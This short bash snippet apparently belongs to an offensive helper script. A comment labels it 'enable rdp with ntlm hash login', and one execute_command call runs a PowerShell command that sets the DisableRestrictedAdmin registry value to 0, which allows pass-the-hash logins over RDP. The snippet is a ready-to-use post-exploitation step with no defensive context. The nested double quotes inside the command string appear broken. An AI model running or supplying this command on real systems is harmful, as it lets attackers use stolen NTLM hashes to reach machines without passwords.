#!/bin/bash

: '
Powershell: enable rdp with ntlm hash login
'

execute_command "Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Lsa' -name "DisableRestrictedAdmin" -value 0"
create_new_line
